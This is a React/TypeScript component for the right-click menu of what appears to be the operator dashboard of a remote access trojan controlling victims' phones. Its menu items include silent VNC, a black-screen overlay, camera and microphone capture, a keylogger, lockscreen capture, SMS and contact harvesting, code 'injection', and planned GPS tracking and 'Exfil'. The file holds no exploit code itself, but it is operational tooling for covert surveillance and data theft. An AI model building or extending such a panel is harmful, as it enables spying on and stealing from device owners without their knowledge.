import { useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import type { Cliente, ContextMenuSection } from '@/types/dashboard';
import { useTranslation } from '../../utils/i18n';

interface ContextMenuProps {
  visible: boolean;
  x: number;
  y: number;
  cliente: Cliente | null;
  onClose: () => void;
  onRename?: (cliente: Cliente) => void;
  onDelete?: (cliente: Cliente) => void;
}

export default function ContextMenu({ visible, x, y, cliente, onClose, onRename, onDelete }: ContextMenuProps) {
  const navigate = useNavigate();
  const menuRef = useRef<HTMLDivElement>(null);
  const { t } = useTranslation();

  const MENU_SECTIONS: ContextMenuSection[] = [
    {
      title: t('menu.screen_section'),
      items: [
        { id: 'screen', label: t('menu.screen_control'), icon: '📺', panel: 'screen' },
        { id: 'silent', label: t('menu.silent_vnc'), icon: '🔇', panel: 'silent' },
        { id: 'touchVisualizer', label: t('menu.touch_vis'), icon: '🎯', panel: 'touchVisualizer' },
        { id: 'blackScreen', label: t('menu.black_screen'), icon: '⬛', panel: 'blackScreen' },
        { id: 'screenReader', label: t('menu.screen_reader'), icon: '👁️', panel: 'screenReader' },
      ],
    },
    {
      title: t('menu.media_section'),
      items: [
        { id: 'camera', label: t('menu.camera'), icon: '📷', panel: 'camera' },
        { id: 'mic', label: t('menu.mic'), icon: '🎤', panel: 'mic' },
      ],
    },
    {
      title: t('menu.data_section'),
      items: [
        { id: 'apps', label: t('menu.apps'), icon: '📱', panel: 'apps' },
        { id: 'keylogger', label: t('menu.keylogger'), icon: '⌨️', panel: 'keylogger' },
        { id: 'lockscreen', label: t('menu.lockscreen'), icon: '🔒', panel: 'lockscreen' },
        { id: 'sms', label: t('menu.sms'), icon: '💬', panel: 'sms' },
        { id: 'contacts', label: t('menu.contacts'), icon: '👥', panel: 'contacts' },
      ],
    },
    {
      title: t('menu.layout_section'),
      items: [
        { id: 'floating', label: t('menu.floating'), icon: '🪟', panel: 'floating' },
      ],
    },
    {
      title: t('menu.device_section'),
      items: [
        { id: 'reconnect', label: t('menu.restart_conn'), icon: '🔌' },
        { id: 'rename', label: t('menu.rename'), icon: '✏️' },
        { id: 'delete', label: t('menu.delete_offline'), icon: '🗑️' },
      ],
    },
    {
      title: t('menu.soon_section'),
      items: [
        { id: 'gps', label: t('menu.gps'), icon: '📍', disabled: true, hint: t('sidebar.soon') },
        { id: 'injection', label: t('menu.injection'), icon: '💉', panel: 'injection' },
        { id: 'broadcast', label: 'Broadcast', icon: '📡', disabled: true, hint: t('sidebar.soon') },
        { id: 'exfil', label: 'Exfil', icon: '📤', disabled: true, hint: t('sidebar.soon') },
      ],
    },
  ];

  useEffect(() => {
    if (!visible || !menuRef.current) return;

    const rect = menuRef.current.getBoundingClientRect();
    const maxX = window.innerWidth - rect.width - 8;
    const maxY = window.innerHeight - rect.height - 8;
    if (rect.right > window.innerWidth) {
      menuRef.current.style.left = `${Math.max(8, maxX)}px`;
    }
    if (rect.bottom > window.innerHeight) {
      menuRef.current.style.top = `${Math.max(8, maxY)}px`;
    }
  }, [visible, x, y]);

  if (!visible || !cliente) return null;

  const isOnline = cliente.status === 'online';

  const handleAction = (item: any) => {
    const itemDisabled = item.disabled || (!!item.panel && !isOnline) || (item.id === 'delete' && isOnline);
    if (itemDisabled) return;

    if (item.id === 'rename') {
      if (onRename) onRename(cliente);
      onClose();
      return;
    }

    if (item.id === 'reconnect') {
      if (isOnline) {
        const token = localStorage.getItem('token');
        fetch(`/api/devices/${cliente.deviceId}/command`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({ action: 'RECONNECT_CONNECTION' })
        }).catch(err => console.error('Erro ao reiniciar conexão:', err));
      }
      onClose();
      return;
    }

    if (item.id === 'delete') {
      if (onDelete) onDelete(cliente);
      onClose();
      return;
    }

    if (!item.panel) return;
    navigate(`/device/${cliente.deviceId}`, { state: { openPanel: item.panel } });
    onClose();
  };

  return (
    <>
      <div className="fixed inset-0 z-[100]" onClick={onClose} onContextMenu={(e) => e.preventDefault()} />
      <div
        ref={menuRef}
        className="fixed z-[101] min-w-[220px] max-w-[280px] bg-[#290903]/90 backdrop-blur-md border border-blue-500/20/80 rounded-xl shadow-2xl shadow-black/50 py-1 text-sm"
        style={{ left: x, top: y }}
        onClick={(e) => e.stopPropagation()}
      >
        <div className="px-3 py-2.5 border-b border-blue-500/10/80">
          <p className="text-white font-semibold truncate">{cliente.modelName || cliente.tag}</p>
          <p className="text-cyan-400 font-mono text-xs truncate">{cliente.ip}</p>
          {!isOnline && (
            <p className="text-red-400 text-[10px] mt-1">Dispositivo offline</p>
          )}
        </div>

        {MENU_SECTIONS.map((section, sectionIdx) => (
          <div key={section.title ?? sectionIdx}>
            {section.title && (
              <p className="px-3 pt-2 pb-1 text-[10px] uppercase tracking-widest text-slate-500 font-semibold">
                {section.title}
              </p>
            )}
            {section.items.map((item) => {
              const itemDisabled = item.disabled || (!!item.panel && !isOnline);
              return (
                <button
                  key={item.id}
                  type="button"
                  disabled={itemDisabled}
                  title={item.hint ?? (itemDisabled && !isOnline ? 'Dispositivo offline' : undefined)}
                  onClick={() => handleAction(item)}
                  className={`w-full text-left px-3 py-1.5 flex items-center gap-2 transition-colors ${
                    itemDisabled
                      ? 'text-slate-600 cursor-not-allowed opacity-50'
                      : 'text-slate-200 hover:bg-[#440e05]/80 hover:text-white'
                  }`}
                >
                  {item.icon && <span className="w-5 text-center">{item.icon}</span>}
                  <span>{item.label}</span>
                </button>
              );
            })}
            {sectionIdx < MENU_SECTIONS.length - 1 && (
              <div className="my-1 border-t border-blue-500/10/80" />
            )}
          </div>
        ))}
      </div>
    </>
  );
}
